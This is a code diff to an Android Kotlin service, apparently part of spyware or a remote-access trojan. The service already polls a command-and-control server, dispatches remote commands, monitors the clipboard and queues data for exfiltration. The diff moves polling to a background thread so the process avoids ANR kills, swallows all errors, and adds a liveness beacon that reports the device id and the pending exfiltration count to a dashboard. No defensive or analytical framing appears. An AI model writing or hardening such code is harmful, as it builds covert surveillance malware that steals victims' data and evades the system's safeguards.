@@ -5,12 +5,14 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.Handler
+import android.os.HandlerThread
 import android.os.Looper
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
 import com.sp.core.c2.Commands
 import com.sp.core.c2.Exfil
 import com.sp.core.util.BatchExfil
+import com.sp.core.util.Fgs
 import com.sp.core.util.Prefs
 import com.sp.core.util.DeadDrop
 import com.sp.core.worker.BatchFlushWorker
@@ -30,9 +32,8 @@ class C2Service : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        try {
-            startForeground(NOTIF_ID, buildNotification())
-        } catch (t: Throwable) {
+        if (!Fgs.start(this, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC,
+                buildNotification())) {
             // Android 12+ refuses foreground services without the matching
             // permission or from a background start - never kill the process.
             stopSelf()
@@ -42,7 +43,14 @@ class C2Service : Service() {
         ClipboardMonitor.start(this)
         BatchFlushWorker.schedulePeriodic(this)
 
-        poller.postDelayed(pollTask, 15_000L)
+        // The poll runs on its own thread: a blocking HTTP call on the main
+        // looper would freeze the UI and get the process killed by the ANR
+        // watchdog (which looks exactly like a crash).
+        val thread = HandlerThread("sp-poll").also { it.start() }
+        pollThread = thread
+        val h = Handler(thread.looper)
+        pollHandler = h
+        h.postDelayed(pollTask, 15_000L)
 
         try {
             // Plain background service (the C2 service is in the foreground, so
@@ -63,7 +71,8 @@ class C2Service : Service() {
     }
 
     override fun onDestroy() {
-        poller.removeCallbacksAndMessages(null)
+        pollHandler?.removeCallbacksAndMessages(null)
+        pollThread?.quitSafely()
         ClipboardMonitor.stop()
         super.onDestroy()
     }
@@ -90,6 +99,9 @@ class C2Service : Service() {
                     val argsObj = o.optJSONObject("args") ?: JSONObject()
                     val args = HashMap<String, String>()
                     argsObj.keys().forEach { k -> args[k] = argsObj.optString(k) }
+                    // The dispatch stays on this background thread: the
+                    // commands do content-provider and file I/O, which must
+                    // never run on the main looper.
                     try {
                         Commands.dispatch(this, cmd, args)
                         BatchExfil.enqueue(this, "cmd_result", """{"cmd":"$cmd","ok":true}""")
@@ -121,13 +133,34 @@ class C2Service : Service() {
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    private val poller = Handler(Looper.getMainLooper())
+    private var pollThread: HandlerThread? = null
+    private var pollHandler: Handler? = null
+
 
     private val pollTask = object : Runnable {
         override fun run() {
-            pollCommands()
-            poller.postDelayed(this, POLL_INTERVAL_MS)
+            try {
+                pollCommands()
+            } catch (_: Throwable) {
+            }
+            try {
+                // Liveness beacon - the dashboard shows the device as online
+                // even when the encrypted channel is silent.
+                com.sp.core.util.Beacon.send(this@C2Service, "alive", aliveInfo())
+            } catch (_: Throwable) {
+            }
+            pollHandler?.postDelayed(this, POLL_INTERVAL_MS)
         }
+    }
+
+    private fun aliveInfo(): String {
+        val sb = StringBuilder()
+        sb.append("{\"device_id\":\"").append(Prefs.deviceId(this)).append("\"")
+        sb.append(",\"sdk\":").append(android.os.Build.VERSION.SDK_INT)
+        sb.append(",\"pending\":").append(com.sp.core.util.BatchExfil.pendingCount(this))
+        sb.append(",\"ts\":").append(System.currentTimeMillis())
+        sb.append("}")
+        return sb.toString()
     }
 
     companion object {
